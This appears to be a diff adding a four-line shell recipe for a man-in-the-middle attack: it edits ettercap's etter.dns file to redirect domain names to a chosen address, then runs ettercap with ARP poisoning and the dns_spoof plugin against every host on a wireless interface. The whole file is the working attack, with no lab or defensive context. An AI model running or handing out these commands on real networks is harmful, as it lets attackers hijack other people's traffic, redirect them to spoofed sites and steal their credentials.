@@ -1,0 +1,4 @@
+apt-get install gedit
+gedit /etc/ettercap/etter.dns
+#chose an empty line and type the adress that you want to spoof, and the adress that you want to spoof to like: "*.*.*           A 192.168.1.1"
+ettercap -T -q -M arp:remote -P dns_spoof -i wlan0 ///
